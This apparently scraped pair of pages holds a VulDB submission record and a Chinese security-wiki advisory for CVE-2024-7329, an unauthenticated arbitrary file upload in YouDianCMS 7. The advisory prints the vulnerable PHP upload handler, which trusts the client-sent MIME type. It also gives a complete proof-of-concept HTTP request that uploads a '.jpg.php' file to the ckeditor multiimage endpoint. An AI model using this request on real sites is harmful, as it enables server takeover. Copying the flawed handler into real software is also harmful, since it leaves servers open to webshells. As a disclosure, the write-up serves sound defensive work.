=== Content from vuldb.com_c9ab5173_20250110_221911.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)🛡 Home[Submit](?submit)378324
# Submit #378324: 长沙友点软件科技有限公司 YouDianCMS 7 Unrestricted Upload[info](?kb.submission)

| Title | 长沙友点软件科技有限公司 YouDianCMS 7 Unrestricted Upload |
| --- | --- |
| Description | YouDianCMS（友点企业网站管理系统）是一个集PC站、手机站、微网站、多端小程序（微信、百度、抖音/头条、支付宝、QQ、360小程序）、APP于一体的企业建站解决方案。 YouDianCMS 7版本的前台 存在 任意文件上传漏洞。攻击者可以绕过MIME类型检查，上传恶意的PHP文件到服务器。由于系统未对上传文件进行有效的类型验证，攻击者可以利用这一漏洞上传并执行服务器端脚本，从而获取服务器的控制权限。 |
| Source | ⚠️ https://wiki.shikangsi.com/post/share/30c24c77-42e6-4a0c-b60b-e02d09dc325b |
| User | [XingYue\_Mstir (UID 72225)](?user.72225) |
| Submission | 07/21/2024 06:24 PM (6 months ago) |
| Moderation | 07/31/2024 02:14 PM (10 days later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [273252](?id.273252) [YouDianCMS 7 image\_upload.php files unrestricted upload] |
| Points | 20 |

[◂ Previous](?submit.378323)[Overview](?submit)[Next ▸](?submit.378325)

# Do you need the next level of professionalism?

Upgrade your account now!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[© 1997-2025 vuldb.com](?kb.terms) · [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.378324 "German") · [fr](/fr/?submit.378324 "French") · [it](/it/?submit.378324 "Italian") · [es](/es/?submit.378324 "Spanish") · [pt](/pt/?submit.378324 "Portuguese") · [ru](/ru/?submit.378324 "Russian") · [pl](/pl/?submit.378324 "Polish") · [sv](/sv/?submit.378324 "Swedish") · [zh](/zh/?submit.378324 "Chinese") · [ja](/ja/?submit.378324 "Japanese") · [ar](/ar/?submit.378324 "Arabic")[v18.14.7](?kb.changelog)

=== Content from wiki.shikangsi.com_8ff6fc18_20250110_221918.html ===

# 安全团队贡献平台

导航切换

* [首页](/)
* 所有信息
  + [所有情报](/list/all/)
  + [推荐专区](/list/recommend/)
  + [综合情报](/list/wiki/)
  + [用户提交](/list/userpost/)
  + [高校情报](/list/school/)
* [排行榜](/user/)
* [礼品中心](/gift/)
* [搜索](/search/)
* [公告](/announcements/)
* [IPwhois新功能](/ip/)
* [WooYun drops新功能](/wooyun/)
* 更多
  + [edudata平台](https://wiki.shikangsi.com/cas/jump/edudata)
  + [零组知识库-006应急响应目录](https://wiki.shikangsi.com/post/3629/)
  + [零组知识库-007内网渗透目录](https://wiki.shikangsi.com/post/3631/)
  + [零组知识库-009安全技术目录](https://wiki.shikangsi.com/post/3632/)
  + [零组知识库-010域渗透目录](https://wiki.shikangsi.com/post/3633/)
  + [零组知识库-011运维与二进制安全目录](https://wiki.shikangsi.com/post/3634/)
  + [XSS平台](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrc数据分析](http://data.shikangsi.com/)
  + [友情链接](https://wiki.shikangsi.com/links/)
  + [wiki社区](https://wiki.shikangsi.com/zone/)

[提交贡献](/add/)

[登录](/login/)

[注册](/register/)

# 【原创】（CVE-2024-7329）YouDianCMS 7 任意文件上传漏洞

---

分享
### 当前为私密分享，无需登录即可查看。

---

| 时间 | 作者 | 可见性 | 等级 | Rank |
| --- | --- | --- | --- | --- |
|| 2024-07-21 23:02:21 | [Mstir](/profile/607/) | 公开的 | 高危 | 0 |
| --- | --- | --- | --- | --- |

CVE-2024-7329
Created: 07/31/2024 02:19 PM
Updated: 08/01/2024 01:20 PM
Changes: 07/31/2024 02:19 PM (55), 08/01/2024 03:25 AM (18), 08/01/2024 01:20 PM (1)
Submitter: Mstir@Wiki

---

# 漏洞描述

> YouDianCMS（友点企业网站管理系统）是一个集PC站、手机站、微网站、多端小程序（微信、百度、抖音/头条、支付宝、QQ、360小程序）、APP于一体的企业建站解决方案。

YouDianCMS 7版本的前台 存在 任意文件上传漏洞。攻击者可以绕过MIME类型检查，上传恶意的PHP文件到服务器。由于系统未对上传文件进行有效的类型验证，攻击者可以利用这一漏洞上传并执行服务器端脚本，从而获取服务器的控制权限。

# 审计过程

定位到了一处文件上传点:

```
<?php
 define ( 'IN_BAMBOO', true );
 // 取得根目录
define ( 'ROOT_PATH', '../../../../' );  // back to your root path

$arrType = array (
        'image/jpg',
        'image/gif',
        'image/png',
        'image/bmp',
        'image/pjpeg',
        'image/jpeg'
);
$max_size = 500 * 1024; // 最大文件限制（单位：byte）
$upfile = ROOT_PATH.'image/uploads'; // 图片目录路径
if (!isset($_FILES ['files'])){
    echo '{"result":"400","msg":"未能找到图片，请确认图片是否过大"}';
    exit ();
}
$file = $_FILES ['files'];

if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // 判断提交方式是否为POST
    if (! is_uploaded_file ( $file ['tmp_name'] )) { // 判断上传文件是否存在
        echo '{"result":"400","msg":"图片不存在"}';
        exit ();
    }

    if ($file ['size'] > $max_size) { // 判断文件大小是否大于500000字节
        echo '{"result":"400","msg":"上传图片太大，最大支持：'.($max_size/1024).'KB"}';
        exit ();
    }
    if (! in_array ( $file ['type'], $arrType )) { // 判断图片文件的格式
        echo '{"result":"400","msg":"上传图片格式不对"}';
        exit ();
    }
    if (! file_exists ( $upfile )) { // 判断存放文件目录是否存在
        mkdir ( $upfile, 0755, true );
    }
    $imageSize = getimagesize ( $file ['tmp_name'] );
    $img = $imageSize [0] . '*' . $imageSize [1];
    $fname = $file ['name'];
    $ftype = explode ( '.', $fname );
    $time = explode ( " ", microtime () );
    $time = $time [1] . ($time [0] * 1000);
    $time2 = explode ( ".", $time );
    $time = $time2 [0];
    $returnName=$time."." .end($ftype);
    $picName = $upfile . "/" . $returnName ;

    if (! move_uploaded_file ( $file ['tmp_name'], $picName )) {
        echo '{"result":"400","msg":"从:'.$file ['tmp_name'].'移动图片到:'.$picName.'出错"}';
        exit ();
    } else {
        echo '{"result":"200","imgurl":"image/uploads/' . $returnName . '"}';
    }
}

?>

```

发现并未有鉴权 只需绕过MIME头即可上传php文件.

![null](/media/images/2024/07/21/1ef41508-e4a7-47c3-bbc1-204f4a2ac38c-LVEusH9i.png)

# POC

```
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Host: x.x.x.x
Content-Length: 202
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.3611
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
Connection: close

------WebKitFormBoundarydAPjrmyKewWuf59H
Content-Disposition: form-data; name="files"; filename="c1.jpg.php"
Content-Type: image/jpg

<?php phpinfo();?>
------WebKitFormBoundarydAPjrmyKewWuf59H--

```

---

审核评价： 没有任何评价...

2014-2022 © 联系邮箱：admin@sg95.cn    [鄂ICP备15020128号-4](https://beian.miit.gov.cn)


